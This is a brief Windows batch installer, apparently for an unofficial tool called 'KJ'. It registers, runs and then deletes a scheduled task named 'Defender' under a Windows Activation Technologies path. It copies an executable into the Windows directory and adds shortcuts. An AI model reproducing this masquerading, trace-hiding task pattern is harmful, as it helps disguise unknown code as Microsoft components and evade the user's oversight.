@echo off
pushd %~dp0
set ScriptPath=%~dp0

schtasks /create /tn "\Microsoft\Windows\Windows Activation Technologies\Defender" /xml Defender.xml /f >nul
schtasks /Run /tn "\Microsoft\Windows\Windows Activation Technologies\Defender" >nul
schtasks /Delete /tn "\Microsoft\Windows\Windows Activation Technologies\Defender" /f >nul

if not exist "%Windir%\KJ.exe" copy /y "KJ_Starter\KJ_Starter.lnk" "%Systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\KJ_Starter.lnk"
if not exist "%Windir%\KJ.exe" copy /y "KJ_Starter\KJ_Starter.lnk" "%Userprofile%\¹ÙÅÁ È­¸é\KJ_Starter.lnk" >nul
if not exist "%Windir%\KJ.exe" copy /y "KJ_Starter\KJ_Starter.lnk" "%Userprofile%\Desktop\KJ_Starter.lnk" >nul
if not exist "%Windir%\KJ.exe" copy /y "KJ_Starter\KJ_Starter.exe" "%Windir%\KJ.exe" >nul

:INSTALL
Start /w KJ_k.exe
exit

